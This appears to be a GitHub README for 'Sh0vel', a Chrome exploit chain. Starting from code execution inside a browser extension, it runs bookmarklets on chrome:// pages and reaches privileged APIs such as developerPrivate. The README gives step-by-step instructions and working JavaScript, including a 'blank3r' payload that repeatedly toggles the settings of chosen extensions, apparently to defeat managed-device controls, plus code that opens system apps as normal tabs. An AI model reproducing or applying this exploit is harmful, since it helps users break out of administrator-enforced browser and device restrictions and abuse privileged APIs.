![Sh0vel logo](/oie_i9TLE9czG77X.jpg)
# Sh0vel
Sh0vel is an exploit letting bookmarklets run on almost any url, most notably chrome urls, allowing you to access permissions like developerPrivate or settingsPrivate from within an extension.

# Steps:
- Step 1: Get code execution in an extension. This can be by point-blank, skiovox breakout (preferably), XSS, DNS spoofing, or some other wacky way, but you need code execution in the extension.

- Step 2: Verify it has the correct permissions. For this to work, the following permissions are needed:
    - tabs
    - activeTab
    - browserAction
    - 'unsafe-eval' set in the CSP

If it does not have these permissions, this will not work.
- Step 3: Enable the flag "#extensions-on-chrome-urls"
- Step 4: Get a bookmarklet. This is fairly straight-forward. I'll use blank3r as an example.
- Step 5: Place the bookmarklet as follows:
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `location.href="javascript:replace this part with your own bookmarklet.";`});});

Make the extension run that code.
If you wanted to use blank3r, you would use this code:

chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `let link=window.open('about:blank','_blank');link.location.href="javascript:let shim = false;var ids = prompt('extension ids (comma separated)').split(',');setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);";`});});

- Step 6: Open the url you want this code to run on. For blank3r, open chrome://extensions.
If you want to run code on an SWA (e.g. chrome://os-settings), you will need to open it as
a normal tab. This can be accomplished with the code below (thank you Writable):
chrome.tabs.create({}, () => {chrome.tabs.update(null, {url: "chrome://file-manager"});});

and you can replace chrome://file-manager with the SWA of your choosing.

- Step 7: Click the extension icon. If done correctly, your bookmarklet will run!

# Credits:
Writable for helping me open SWAs as a normal tab
Me for the finding the original API access exploit
Peap for writing this github page.
The rest of whelement: mental support while I struggled with random things


# Explanation: 
We can enable the extensions-on-chrome-urls flag to allow code to run as content scripts
on chrome urls, but tabs.executeScript runs without access to some variables in the page it
runs in, notably the chrome object. However, if the extension that invoked tabs.executeScript
has access to use eval, it also has a small side effect: letting us use javascript: urls.
By using an automated version of the point-blank exploit, we can use a javascript bookmarklet
on a chrome url, and for some reason, it runs with access to the chrome object for its opener.
A lot of new things are possible with this, such as spawning webviews from the file manager , 
using blank3r on the latest version, and more.

Aside from trying to run code on chrome urls, it's possible to use normal bookmarklets this way
to launch applications like eruda into pages without it being run as a content script. 
